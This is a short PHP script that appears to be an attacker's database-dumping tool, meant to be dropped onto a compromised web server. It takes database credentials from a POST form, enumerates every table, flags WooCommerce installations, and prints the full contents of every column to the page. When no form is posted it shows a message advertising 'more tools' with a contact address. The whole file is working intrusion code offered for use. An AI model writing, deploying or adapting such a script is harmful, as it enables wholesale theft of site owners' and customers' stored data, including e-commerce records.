<?php
ini_set("max_execution_time", 0);

if(isset($_POST["gass"])) {
	$host = $_POST["host"];
	$user = $_POST["user"];
	$pass = $_POST["pass"];
	$db   = $_POST["db"];

	function getdata($con, $sql) {
		$cdb = mysqli_query($con, $sql);
		$res = array();
		while($cok = mysqli_fetch_array($cdb)) {
			$res[] = $cok[0];
		}
		return $res;
	}

	$con = mysqli_connect($host,$user,$pass) or die("Can't connect to database");
	$q1 = getdata($con, "SHOW TABLES FROM ".$db);
	foreach ($q1 as $tb) {
		if (preg_match('/woocommerce|WOOCOMMERCE/i', $tb)) {
			echo "Woocommerce installed";
		}
		$q2 = getdata($con, "SHOW COLUMNS FROM $db.$tb");
		foreach ($q2 as $col) {
			$q3 = getdata($con, "SELECT $col FROM $db.$tb");
			foreach ($q3 as $data) {
				echo "$data<br>";
			}
		}
	}
	mysqli_close($con);
} else {
	echo "need more tools ? you can pm me, androxghost1337@gmail.com";
}

?>